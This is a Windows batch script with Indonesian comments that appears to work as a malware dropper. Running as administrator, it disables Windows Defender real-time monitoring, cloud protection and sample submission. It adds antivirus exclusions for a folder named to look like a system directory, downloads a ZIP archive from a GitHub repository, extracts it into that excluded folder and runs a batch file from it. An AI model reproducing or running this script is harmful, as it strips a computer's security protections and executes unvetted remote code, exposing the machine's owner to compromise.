@echo off
:: Wajib dijalankan sebagai Administrator

set "folderPath=C:\ProgramData\AppData"
set "zipName=XMASTERTES.zip"
set "extractFolder=XMASTERTES-main"
set "fullPath=%folderPath%\%extractFolder%"

:: Buat folder jika belum ada
mkdir "%folderPath%" 2>nul

:: ===== Nonaktifkan Proteksi Windows Defender =====
powershell -Command "Set-MpPreference -DisableRealtimeMonitoring $true"
powershell -Command "Set-MpPreference -MAPSReporting 0"                 :: Nonaktifkan cloud protection
powershell -Command "Set-MpPreference -SubmitSamplesConsent 2"          :: Nonaktifkan sample submission
:: Nonaktifkan Tamper Protection (ini tidak bisa lewat PowerShell biasa, hanya bisa lewat Intune atau registry tweak + reboot, jadi hanya catatan)
:: echo Tamper Protection must be disabled manually or via policy

:: Tambahkan path ke pengecualian **SEBELUM** ekstrak
powershell -Command "Add-MpPreference -ExclusionPath '%folderPath%'"

:: ===== Unduh ZIP dari GitHub =====
powershell -nologo -noprofile -executionpolicy bypass -command ^
"Invoke-WebRequest -Uri 'https://codeload.github.com/FooTex16/XMASTERTES/zip/refs/heads/main' -OutFile '%folderPath%\%zipName%'"

:: ===== Ekstrak ZIP =====
powershell -nologo -noprofile -executionpolicy bypass -command ^
"Expand-Archive -Path '%folderPath%\%zipName%' -DestinationPath '%folderPath%' -Force"

:: ===== Tambahkan folder hasil ekstrak ke pengecualian juga =====
powershell -Command "Add-MpPreference -ExclusionPath '%fullPath%'"

:: ===== Buka folder dan Jalankan RunScript.bat =====
start "" explorer "%fullPath%"

if exist "%fullPath%\RunScript.bat" (
    start "" "%fullPath%\RunScript.bat"
)

exit
